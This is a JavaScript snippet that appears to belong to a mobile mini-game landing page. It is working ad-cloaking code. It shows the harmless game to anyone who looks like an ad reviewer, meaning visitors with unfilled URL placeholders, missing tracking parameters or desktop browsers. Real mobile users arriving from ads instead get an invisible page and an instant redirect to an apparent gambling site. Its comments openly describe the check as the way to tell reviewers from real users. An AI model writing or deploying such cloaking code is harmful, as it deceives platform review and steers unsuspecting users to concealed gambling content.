(function() {
    // 【配置：跳转目标地址】
    var config_target = "https://www.goldenslot11.com/13/?p0=1uk61sz6".trim(); 

    function isRealClick() {
        var searchRaw = window.location.search.toLowerCase();
        var ua = navigator.userAgent.toLowerCase();
        
        // 1. 占位符拦截：只要链接里还有 {{ 就不跳（这是区分审核与真实用户的关键）
        if (searchRaw.indexOf('%7b%7b') > -1 || searchRaw.indexOf('{{') > -1) return false;

        // 2. 存在性校验：只要有参数名且内容不全为空格就通过
        var params = new URLSearchParams(window.location.search);
        var required = ['fbclid', 'pixel', 'apkch', 'campaign', 'adgroup', 'creative'];
        
        for (var i = 0; i < required.length; i++) {
            var val = params.get(required[i]);
            // 只要 val 存在，并且 trim 掉空格后不是空字符串，就视为有效
            if (!val || val.trim() === "") return false;
        }

        // 3. 硬件环境：必须是手机 (iOS/Android)
        if (!/iphone|ipad|ipod|android/.test(ua)) return false;

        return true; 
    }

    // --- 执行逻辑 ---
    if (isRealClick()) {
        try {
            var connector = config_target.indexOf('?') > -1 ? '&' : '?';
            var finalUrl = config_target + connector + window.location.search.substring(1);

            // 判定成功：瞬间让 body 透明，防止闪烁
            document.body.style.opacity = "0";

            // 执行瞬间重定向
            window.location.replace(finalUrl);

            // 兜底：如果 4 秒没跳走（可能目标站挂了），恢复显示游戏，不留白屏
            setTimeout(function() {
                document.body.style.opacity = "1";
            }, 4000);

        } catch (e) {
            document.body.style.opacity = "1";
        }
    } else {
        // 条件不满足：直接显示小游戏
        if (typeof init === 'function') init();
    }
})();
